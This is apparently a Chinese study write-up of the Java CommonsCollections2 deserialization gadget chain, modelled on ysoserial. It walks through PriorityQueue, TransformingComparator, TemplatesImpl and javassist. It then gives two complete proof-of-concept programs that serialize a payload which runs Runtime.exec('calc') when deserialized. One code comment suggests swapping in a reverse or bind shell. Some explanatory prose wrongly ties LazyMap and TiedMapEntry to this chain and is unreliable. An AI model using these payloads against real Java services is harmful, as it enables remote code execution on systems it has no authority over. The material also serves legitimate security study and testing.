## 环境准备

JDK1.8(8u421)这里ysoserial，我以本地的JDK8版本为准、commons-collections4(4.0 以ysoserial给的版本为准)、javassist(3.12.1.GA)

cc4.0、ClassPool

```xml
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.0</version>
</dependency>
<dependency>
    <groupId>javassist</groupId>
    <artifactId>javassist</artifactId>
    <version>3.12.1.GA</version>
</dependency>
```

## PriorityQueue

`PriorityQueue` 是 Java 中的一个优先队列实现，它实现了 `Queue` 接口并根据队列元素的优先级来决定元素的出队顺序，而不是按照入队顺序。`PriorityQueue` 内部使用堆（通常是二叉堆）来维护元素的顺序，因此其操作时间复杂度通常为对数级别。

### **基本特性**

1. **元素顺序**： `PriorityQueue` 中的元素按自然顺序或由提供的 `Comparator` 排序。默认情况下，`PriorityQueue` 会根据元素的自然顺序进行排序。如果元素是自定义类型，可以通过传递一个 `Comparator` 来指定排序规则。
2. **无界队列**： `PriorityQueue` 是无界的，意味着它可以容纳任意数量的元素，除非 JVM 的内存有限制。
3. **不允许 `null` 元素**： `PriorityQueue` 不允许插入 `null` 元素。如果你尝试插入 `null`，会抛出 `NullPointerException`。
4. **不保证顺序**： 由于使用的是堆数据结构，`PriorityQueue` 中的元素始终被按优先级排列，但并不保证内部的完全顺序（堆结构本身不是一个排序列表，只是能在 O(log n) 时间内提取最小或最大元素）。

### **常用操作**

- **`offer(E e)`**：将元素 `e` 插入队列。如果插入成功，返回 `true`。
- **`poll()`**：移除并返回队列中的最高优先级元素（最小元素或最大元素，取决于排序）。
- **`peek()`**：查看队列中的最高优先级元素，但不移除它。
- **`comparator()`**：返回队列的排序器。如果队列没有显式的排序器（即使用自然顺序），则返回 `null`。

### 使用示例

```java
import java.util.PriorityQueue;

public class PriorityQueueExample {
    public static void main(String[] args) {
        // 使用自然顺序创建优先队列
        PriorityQueue<Integer> pq = new PriorityQueue<>();
        pq.offer(10);
        pq.offer(20);
        pq.offer(5);

        // 输出最小的元素
        System.out.println("Peek: " + pq.peek()); // 5

        // 移除并返回最小的元素
        System.out.println("Poll: " + pq.poll()); // 5
        System.out.println("Poll: " + pq.poll()); // 10
        System.out.println("Poll: " + pq.poll()); // 20
    }
}
```

运行结果

```
Peek: 5
Poll: 5
Poll: 10
Poll: 20
```

### **自定义排序**

可以传递一个 `Comparator` 来定义元素的优先级顺序。

```java
import java.util.PriorityQueue;
import java.util.Comparator;

public class PriorityQueueExample {
    public static void main(String[] args) {
        // 使用自定义排序创建优先队列
        PriorityQueue<Integer> pq = new PriorityQueue<>(Comparator.reverseOrder());
        pq.offer(10);
        pq.offer(20);
        pq.offer(5);

        // 输出最大的元素
        System.out.println("Peek: " + pq.peek()); // 20

        // 移除并返回最大的元素
        System.out.println("Poll: " + pq.poll()); // 20
        System.out.println("Poll: " + pq.poll()); // 10
        System.out.println("Poll: " + pq.poll()); // 5
    }
}
```

结果如下：

```
Peek: 20
Poll: 20
Poll: 10
Poll: 5
```

### CC2中的应用

在 `CC2`（Common Collections 2）链攻击中，`PriorityQueue` 被用作攻击链中的一个重要元素，主要因为它能在反序列化过程中控制优先队列的排序行为，进而触发恶意代码的执行。`PriorityQueue` 在 `CC2` 链中的关键作用通常与反序列化漏洞和链的控制有关，特别是通过特定的序列化类（例如 `LazyMap`、`TiedMapEntry` 等）以及结合其他反序列化漏洞来利用。

在 `CC2` 链中，`PriorityQueue` 可能被用来触发链中的构造操作，从而导致任意代码执行。通过构造恶意的 `PriorityQueue`，攻击者可以通过优先级队列的排序行为来控制链的执行顺序。具体来说，可以通过设置反序列化时的优先队列元素，来精确控制反序列化过程中的行为，触发恶意代码。

1. **`PriorityQueue` 在链中的作用**： 在 `CC2` 链中，`PriorityQueue` 通常与其他容器类（如 `LazyMap`）结合，可以通过修改 `PriorityQueue` 的元素来触发执行链中的恶意代码。
2. **链触发原理**： 在反序列化过程中，`PriorityQueue` 会自动排序元素。可以通过精心构造的元素，在反序列化时触发一个危险的操作（如执行恶意的构造函数或者静态代码块）。特别是在某些特定的 JDK 版本中，`PriorityQueue` 会与其他容器类（例如 `LazyMap`）协作，形成一个利用链。
3. **反序列化攻击中的 `PriorityQueue` 配置**：
   - `PriorityQueue` 的元素（例如 `TiedMapEntry`）可能包含对恶意代码的引用。
   - 通过反序列化时的排序操作，能够触发优先队列的排序逻辑，从而触发恶意代码。

### 重要的方法代码片段

```java
// 往队列中添加数据
public boolean add(E e) {
    return offer(e);
}
// 实际调用的添加方法
public boolean offer(E e) {
    if (e == null)
        throw new NullPointerException();
    modCount++;
    int i = size;
    if (i >= queue.length)
        grow(i + 1);
    size = i + 1;
    if (i == 0)
        queue[0] = e;
    else
        // 将元素放置到合适的位置中
        siftUp(i, e);
    return true;
}
// 如果队列有比较器，则使用比较器，否则使用默认比较器
private void siftUp(int k, E x) {
    if (comparator != null)
        // 重点关注这个方法
        siftUpUsingComparator(k, x);
    else
        siftUpComparable(k, x);
}
// 使用比较器来调整元素位置
private void siftUpUsingComparator(int k, E x) {
    while (k > 0) {
        int parent = (k - 1) >>> 1;
        Object e = queue[parent];
        if (comparator.compare(x, (E) e) >= 0)
            break;
        queue[k] = e;
        k = parent;
    }
    queue[k] = x;
}
// 加入多个元素时，调用这个heapify方法，简单理解就是heapify一下可以把所有元素的顺序都调整好
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}
// 这个和siftUp是一个相反操作，可以了解一下优先级队列(堆)原理
// 我们还是只关注siftDownUsingComparator方法
private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}
// 然后看这个方法，关键点在于它调用了comparator的compore方法，这和下边介绍的TransformingComparator结合起来就可以打一套组合拳
private void siftDownUsingComparator(int k, E x) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
```

## TransformingComparator

### 基本功能

TransformingComparator是org.apache.commons.collections4.comparators包中的一个比较器的装饰器类，这个类重写了compare方法，而compare方法中调用了Transformer的transform方法，这就恰好可以让我们触发攻击链，下边来分析一下具体的代码

```java
package org.apache.commons.collections4.comparators;
......
public class TransformingComparator<I, O> implements Comparator<I>, Serializable {
    private static final long serialVersionUID = 3456940356043606220L;
    private final Comparator<O> decorated;
    private final Transformer<? super I, ? extends O> transformer;
	......
	// 重点看这个方法
    public int compare(I obj1, I obj2) {
        O value1 = this.transformer.transform(obj1);
        O value2 = this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
    }
    ......
}

```

如果我们能把PriorityQueue中的Comparator使用TransformingComparator来创建，那么在PriorityQueue初始化的时候就会调用到heapify方法，而heapify方法恰好可以触发TransformingComparator的compare方法从而执行transform方法，最终执行我们构造的代码

### 初版POC

这里可以先使用CC1的调用链来测试我们的想法是否正确，先写个初版demo吧

```java
public static void main2() throws Exception {
	// ==================调用链代码Start=======================
    Transformer[] transformer_exec = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
    };
    ChainedTransformer chain = new ChainedTransformer(transformer_exec);
	// ===================调用链代码END===============
    // 初始化优先级队列
    PriorityQueue queue = new PriorityQueue();
    // 往队列中添加两个元素
    queue.add(1);
    queue.add(2);
    // 添加完之后通过反射获取到PriorityQueue中的comparator比较器字段
    Field comparator = queue.getClass().getDeclaredField("comparator");
    comparator.setAccessible(true);
    // 使用TransformingComparator获取到一个能执行调用链代码的比较器
    TransformingComparator transformingComparator = new TransformingComparator(chain);
    // 通过反射将比较器设置到queue中
    comparator.set(queue, transformingComparator);

    FileOutputStream fos = new FileOutputStream(fileName);
    ObjectOutputStream oos = new ObjectOutputStream(fos);
    oos.writeObject(queue);
    oos.flush();
    oos.close();
}
// 可以用这个方法来验证反序列化之后是否能触发POC
public static void verify() throws Exception {
    // 本地模拟反序列化
    FileInputStream fis = new FileInputStream(fileName);
    ObjectInputStream ois = new ObjectInputStream(fis);
    Object obj = (Object) ois.readObject();
}
```

来分析一下调用过程

```java
// 再来分析一下PriorityQueue.readObject的方法
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();
	// 这个是我们想要触发的函数
    heapify();
}
// 调用到heapify方法
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}
// 调用siftDown方法
private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}
// 最终调用到该方法
private void siftDownUsingComparator(int k, E x) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        // 在这里会调用到compare方法，这里的compare会调用到TransformingComparator.compare
        // TransformingComparator.compare最终会调用
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
// 在TransformingComparator.compare中触发调用链代码的transform方法，从而执行我们想要的逻辑
public int compare(I obj1, I obj2) {
    O value1 = this.transformer.transform(obj1);
    O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}
```

其实到这个地方，漏洞已经可以被触发了，但是ysoserial中使用了TemplatesImpl来执行对应的调用链代码，所以继续往下学。

## 调用链

* PriorityQueue.readObject
  * PriorityQueue.heapify
    * PriorityQueue.siftDown
      * PriorityQueue.siftDownUsingComparator
        * PriorityQueue.compare
          * TransformingComparator.compare
            * ChainedTransformer.transform()
              * ConstantTransformer.transform()
              * InvokerTransformer.transform()
                * Method.invoke()
                * Class.getMethod()
              * InvokerTransformer.transform()
                * Method.invoke()
                * Runtime.getRuntime()
              * InvokerTransformer.transform()
                * Method.invoke()
                * Runtime.exec()

## TemplatesImpl

`TemplatesImpl` 是 Java 中 `javax.xml.transform` 包中的一个类，它通常与 XSLT（可扩展样式表语言转换）相关，用于存储 XSLT 样式表模板并提供转换功能。`TemplatesImpl` 继承自 `Templates` 类，通常用于创建 XSLT 转换器和处理 XML 数据。

### **基本功能**

`TemplatesImpl` 主要用于存储预编译的 XSLT 模板，它实现了 `Templates` 接口。XSLT 是一种用于转换 XML 文档的语言，`TemplatesImpl` 对象本质上包含了 XSLT 编译后的结果，这些结果用于将 XML 数据转换成其他格式（如 HTML）。

### **主要方法**

- **`getTransformer()`**：返回一个 `Transformer` 实例，该实例根据模板执行 XSLT 转换。
- **`getStylesheet()`**：获取样式表内容，通常为 XSL 文件。

### **内部结构**

`TemplatesImpl` 类通常包含两个重要字段：

1. **`_bytecodes`**：一个存储 XSLT 编译后字节码的数组。
2. **`_tfactory`**：一个 `TransformerFactory` 实例，用于生成 `Transformer`。

这些字段可以被恶意修改，进而触发 `TemplatesImpl` 类的反序列化漏洞。攻击者可以通过修改这些字段，注入恶意代码，导致反序列化时执行任意代码。

```java
public final class TemplatesImpl implements Templates, Serializable {
    static final long serialVersionUID = 673094361519270707L;
    public final static String DESERIALIZE_TRANSLET = "jdk.xml.enableTemplatesImplDeserialization";
	// 重点关注这个常量在defineTransletClasses方法中的使用
    private static String ABSTRACT_TRANSLET
        = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";

    // START===============关注这几个字段
    private String _name = null;
    private byte[][] _bytecodes = null;
    private Class[] _class = null;
    private int _transletIndex = -1;
    private Properties _outputProperties;
    private transient TransformerFactoryImpl _tfactory = null;
	// END==============================
    
    // 这里又一个静态内部类，是一个ClassLoader
    static final class TransletClassLoader extends ClassLoader {

        // 重点关注这个方法就行
        Class defineClass(final byte[] b) {
            // 这里的defineClass最终是调用了ClassLoader中的defineClass方法，后边讲一下这个方法
            return defineClass(null, b, 0, b.length);
        }
    }
    // 重写了readObject方法
    private void readObject(ObjectInputStream is)
      throws IOException, ClassNotFoundException
    {
        SecurityManager security = System.getSecurityManager();
        if (security != null){
            String temp = SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET);
            if (temp == null || !(temp.length()==0 || temp.equalsIgnoreCase("true"))) {
                ErrorMsg err = new ErrorMsg(ErrorMsg.DESERIALIZE_TRANSLET_ERR);
                throw new UnsupportedOperationException(err.toString());
            }
        }
        // 反序列化时会把这几个字段都加载进来
        ObjectInputStream.GetField gf = is.readFields();
        _name = (String)gf.get("_name", null);
        _bytecodes = (byte[][])gf.get("_bytecodes", null);
        _class = (Class[])gf.get("_class", null);
        _transletIndex = gf.get("_transletIndex", -1);

        _outputProperties = (Properties)gf.get("_outputProperties", null);
        _indentNumber = gf.get("_indentNumber", 0);

        if (is.readBoolean()) {
            _uriResolver = (URIResolver) is.readObject();
        }
        _tfactory = new TransformerFactoryImpl();
    }
    
	// getOutputProperties方法是_outputProperties字段的getter方法
    public synchronized Properties getOutputProperties() {
        try {
            return newTransformer().getOutputProperties();
        }
        catch (TransformerConfigurationException e) {
            return null;
        }
    }
    // getOutputProperties调用之后也会触发这个方法
    public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;
		// 触发getTransletInstance方法
        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);

        if (_uriResolver != null) {
            transformer.setURIResolver(_uriResolver);
        }

        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
    // 触发这个方法
    private Translet getTransletInstance()
        throws TransformerConfigurationException {
        if (_name == null) return null;
		// 重点关注defineTransletClasses这个方法
        if (_class == null) defineTransletClasses(s);
		
        AbstractTranslet translet = (AbstractTranslet)
                _class[_transletIndex].getConstructor().newInstance();
        translet.postInitialization();
        translet.setTemplates(this);
        translet.setOverrideDefaultParser(_overrideDefaultParser);
        translet.setAllowedProtocols(_accessExternalStylesheet);
        if (_auxClasses != null) {
            translet.setAuxiliaryClasses(_auxClasses);
        }
        return translet;
    }
}

private void defineTransletClasses()
        throws TransformerConfigurationException {
	......
    for (int i = 0; i < classCount; i++) {
        // 这个地方调用了defineClass方法来构造字节码，将其转换为Class对象
        _class[i] = loader.defineClass(_bytecodes[i]);
        final Class superClass = _class[i].getSuperclass();
        // 这个地方很有意思，如果字节码文件的父类为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，那么就把_transletIndex赋值为当前的字节码文件的索引
        if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
            _transletIndex = i;
        }
        else {
            _auxClasses.put(_class[i].getName(), _class[i]);
        }
    }
	// 如果_bytecodes中没有任何一个类的父类是AbstractTranslet，那么直接抛异常，我们要做的是不让他抛出异常
    if (_transletIndex < 0) {
        ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    ......
}
```


### CC2中的应用

在 CC2（Common Collections 2）链攻击中，`TemplatesImpl` 经常被用作利用目标。CC2 攻击链通过利用 `TemplatesImpl` 类的反序列化漏洞，可以通过构造恶意的 `TemplatesImpl` 对象来触发反序列化时执行的恶意代码。

`TemplatesImpl` 在反序列化时可能被构造为一个恶意的对象，通过操纵其 `_bytecodes` 和 `_tfactory` 字段，能够构造出一个可以触发任意代码执行的对象。在攻击中，`TemplatesImpl` 类的反序列化结合了其他类（例如 `ChainedTransformer`、`LazyMap` 等），从而触发恶意代码的执行。

### **反序列化触发过程**

1. **构造恶意 `TemplatesImpl` 对象**： 攻击者可以构造一个包含恶意字节码的 `TemplatesImpl` 对象。该字节码可以包含一个恶意类，通常是通过使用 `ysoserial` 工具构造的。
2. **修改 `_bytecodes` 字段**： 在反序列化时，`TemplatesImpl` 会将 `_bytecodes` 字段的字节码加载到内存中。这些字节码可能包含恶意类的构造器或静态代码块，导致恶意代码的执行。
3. **通过 `ChainedTransformer` 触发反序列化**： `ChainedTransformer` 是一个常用的构造器，可以将多个转换器串联起来执行。在 CC2 链中，攻击者可以通过 `ChainedTransformer` 在反序列化时触发恶意 `TemplatesImpl` 对象的执行。
4. **利用 `LazyMap` 触发恶意对象的执行**： `LazyMap` 是 `Common Collections` 中的一个类，它会在访问特定键时延迟加载值。在 CC2 链中，攻击者通过 `LazyMap` 和动态代理的结合，可以在反序列化时延迟执行恶意代码。
5. **执行恶意代码**： 一旦反序列化过程完成，恶意代码就会被执行。这通常是通过调用 `Runtime.getRuntime().exec()` 执行一个系统命令（如启动反向 shell 或其他恶意操作）。

### ClassLoader.defineClass

在这个方法中，可以通过二进制字节码文件来创建对应的Class对象

```java
// name为类名
// b为对应的二进制字节码文件
// off为偏移，一般情况下设置为0就行
// len就是要解析的字节码长度
// off + len就是截取字节码中间的一段，但是字节码只有一个class信息时，off=0、len=byte[].length即可
protected final Class<?> defineClass(String name, byte[] b, int off, int len)
        throws ClassFormatError
{
    return defineClass(name, b, off, len, null);
}
```

有了TemplatesImpl这个类的话就可以不需要原来那么繁琐的调用链代码了，只需要把Runtime.getRuntime.exec()这一段代码通过defineClass方法进行触发就行。

```java
// 我们需要一个类继承于AbstractTranslet，这样才能在触发defineTransletClasses方法时不让其抛出异常
public class CCE2Translet extends AbstractTranslet implements Serializable {

    private static final long serialVersionUID = -5971610431559700674L;

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

## ClassPool

`ClassPool` 是 `javassist` 库中的一个核心类，它提供了一个管理和操作字节码的机制。在 Java 反序列化漏洞利用中，`ClassPool` 主要用于动态生成、修改和加载字节码。它的功能对于构造恶意类和构建攻击链至关重要。

### **基本功能**

1. **动态生成字节码：** `ClassPool` 可以通过 `CtClass` 类动态生成 Java 类的字节码。`CtClass` 提供了修改类的构造函数、方法和字段等功能。
2. **修改现有类：** `ClassPool` 允许你在运行时修改现有的类，添加方法、字段，或修改类的行为。这对于构建反序列化漏洞利用链中的恶意类至关重要。

**加载和编译：** `ClassPool` 可以将动态生成的类字节码加载到内存中，也可以将其转换成可以存储或执行的格式。

### **反序列化漏洞中的应用**

在 Java 反序列化漏洞的攻击链中，`ClassPool` 常常被用来动态生成恶意类或修改现有的类结构。例如，通过 `ClassPool` 生成一个恶意的类，这个类在加载或执行时会触发恶意代码执行（如反向 shell、系统命令等）。

攻击者利用 `ClassPool` 可以在反序列化过程中通过创建新的类或修改现有类来注入恶意代码。这个过程通常与字节码操作、反射以及 Java 的类加载机制结合，导致漏洞的触发。

### **ClassPool 的使用场景**

1. **生成恶意类：** 通过 `ClassPool` 创建一个新的类，这个类包含一个静态代码块，静态代码块在类加载时自动执行，触发恶意操作。
2. **修改现有类：** 在反序列化过程中，可以修改某些已有类的字节码，注入恶意方法或字段，进一步操控反序列化流程。
3. **构建反序列化链：** 在 CC2 链等反序列化漏洞利用中，`ClassPool` 通过动态生成恶意类或修改现有类来构建复杂的攻击链。

### CC2中的应用

`ClassPool` 在 CC2 攻击链中的作用是生成恶意的字节码（如构造恶意的 `TemplatesImpl` 或其他类），并通过反序列化漏洞将它们加载到内存中，最终执行恶意代码。攻击者可以利用 `ClassPool` 来生成一个包含恶意静态代码块的类，在类加载时自动触发恶意操作。

**常见攻击链：**

1. **构造恶意的 `TemplatesImpl` 对象：** 攻击者可以使用 `ClassPool` 创建一个新的类，它的静态代码块会执行恶意代码。常见的做法是通过 `TemplatesImpl` 类注入恶意字节码，利用 `ysoserial` 等工具生成恶意类。
2. **生成带有恶意静态初始化块的类：** 通过 `ClassPool`，可以构造一个类，类的静态初始化块在类加载时自动执行，通常执行的操作包括调用系统命令或加载恶意代码。
3. **配合 `ChainedTransformer` 触发：** 在 CC2 中，将恶意的 `TemplatesImpl` 对象与 `ChainedTransformer` 一起使用，通过反序列化链的执行，最终触发恶意类的加载和代码执行。

### 使用示例

ClassPool可以把一个对象转换为对应的字节码，同时支持通过反射来完成一些方法调用的操作，使用方法如下：

```java
import javassist.*;

public class JavassistExample {
    public static void main(String[] args) throws Exception {
        // 创建一个 ClassPool 对象
        ClassPool pool = ClassPool.getDefault();
        // 创建一个新的 CtClass（相当于 Java 类）
        CtClass ctClass = pool.makeClass("com.example.MyClass");
        // 添加一个方法
        CtMethod ctMethod = CtNewMethod.make(
            "public void sayHello() { System.out.println(\"Hello from Javassist!\"); }",
            ctClass);
        String construtorCMD = "System.out.println(\"Hello 构造方法\");";
        //制作一个空的类初始化，并在前面插入要执行的命令语句
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.addMethod(ctMethod);
        // 转换为 Java 类并加载
        Class<?> clazz = ctClass.toClass();
        // 在调用newInstance时，会触发构造函数中的逻辑，输出"Hello 构造方法"
        Object instance = clazz.newInstance();
        // 调用sayHello方法，会输出"Hello from Javassist!"
        clazz.getMethod("sayHello").invoke(instance);
    }
}

```

## 新版本POC - 基于ysoserial

通过这段代码就可以构造一个新的POC了，这个POC使用了TemplatesImpl取代原来的调用链，这里的ClassPool是自己创建的，是一种类似于ysoserial的写法，但是ysoserial中使用了很多代码模板，这里不好把代码迁移过来，会导致代码很长，所以这里直接使用更直接了当的写法。

```java
public class CommonsCollections2 {
    static String serialFileName = "commons-collections2.ser";

    public static void main(String[] args) throws Exception {
        cc2byYsoSerial();
        verify();
    }
    public static void verify() throws Exception {
        // 本地模拟反序列化
        FileInputStream fis = new FileInputStream(serialFileName);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object ignore = (Object) ois.readObject();
    }
    public static void cc2byYsoSerial() throws Exception {

        String executeCode = "Runtime.getRuntime().exec(\"calc\");";
        ClassPool pool = ClassPool.getDefault();
        CtClass evil = pool.makeClass("ysoserial.Evil");
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        evil.makeClassInitializer().insertAfter(executeCode);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        evil.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(AbstractTranslet.class.getName());
        evil.setSuperclass(superC);

        final byte[] classBytes = evil.toBytecode();
        byte[][] trueclassbyte = new byte[][]{classBytes};

        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, trueclassbyte);

        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "Pwnr");

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        Field iMethodName = transformer.getClass().getDeclaredField("iMethodName");
        iMethodName.setAccessible(true);
        iMethodName.set(transformer, "newTransformer");

        Field queueField = queue.getClass().getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queueArray = new Object[]{templates,1};
        queueField.set(queue,queueArray);

        FileOutputStream fos = new FileOutputStream(serialFileName);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(queue);
        oos.flush();
        oos.close();
    }
}
```

执行结果如下，计算器被弹出

![image-20241118221954685](./main.assets/cc2-1.png)

## 调用链总结

* PriorityQueue.readObject()
  * PriorityQueue.heapify()
    * PriorityQueue.siftDown()
      * PriorityQueue.siftDownUsingComparator()
        * TransformingComparator.compare()
          * InvokerTransformer.transform()
            * TemplatesImpl.newTransformer()
              * TemplatesImpl.getTransletInstance()

注意：当InvokerTransformer.newTransformer()被调用时，就触发了TemplatesImpl中的创建payload实例的代码，当继承了AbstractTranslet的类的实例被创建时，会调用构造默认函数，在被调用了默认构造函数时，payload代码就会被执行(也就是Runtime.getRuntime().exec("calc")就会被执行。)

虽然ysoserial中使用的ClassPool的方式构造的poc，但是实际场景中，可能目标主机中并没有引用这个第三方库，所以有时候使用初版POC也是不错的选择。

